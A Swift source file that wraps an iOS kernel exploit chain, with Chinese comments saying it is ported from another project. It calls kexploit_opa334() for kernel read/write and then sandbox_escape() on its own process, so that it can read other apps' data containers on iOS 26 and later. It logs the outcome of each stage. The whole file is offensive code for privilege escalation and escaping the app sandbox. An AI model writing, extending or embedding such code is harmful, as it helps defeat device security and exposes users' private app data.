import Foundation

/// 内核提权 + 沙箱逃逸桥（移植自 3105 的 KernelExploit）。
///
/// iOS 26+ 上读别的 App 容器必须两步都成功：
///   1. `kexploit_opa334()` → 内核读写
///   2. `sandbox_escape(proc_self())` → 脱离沙箱，才能 `readdir`/`open` 容器路径
/// 只做第 1 步时容器目录仍然不可见（3105 的注释里称之为 "bad_query path"）。
enum KernelBridge {
    static var hasSandboxAccess: Bool {
        sandbox_access_is_active() == 1
    }

    static var requiresSandboxEscape: Bool {
        TraceAppInfo.osVersionTuple.0 >= 26
    }

    /// 必须在后台线程调用（10–30 秒，期间界面会卡顿）
    @discardableResult
    static func run() -> Bool {
        traceLog("kexploit: stage 1/2 — kernel r/w")
        let ret = kexploit_opa334()
        guard ret == 0 else {
            traceLog("kexploit: FAILED — kexploit_opa334 returned \(ret)")
            return false
        }
        traceLog("kexploit: stage 1 ok — kernel r/w established")

        let selfProc = proc_self()
        guard selfProc != 0 else {
            traceLog("kexploit: FAILED — proc_self() returned 0")
            return false
        }

        traceLog("kexploit: stage 2/2 — sandbox escape")
        let sbx = sandbox_escape(selfProc)
        if sbx == 0, hasSandboxAccess {
            traceLog("kexploit: COMPLETE — sandbox escaped")
            return true
        }

        let major = TraceAppInfo.osVersionTuple.0
        if major < 26 {
            traceLog("kexploit: sandbox_escape returned \(sbx) — kernel r/w only (iOS \(major))")
            return true
        }
        traceLog("kexploit: FAILED — sandbox escape returned \(sbx), access active=\(hasSandboxAccess)")
        return false
    }
}
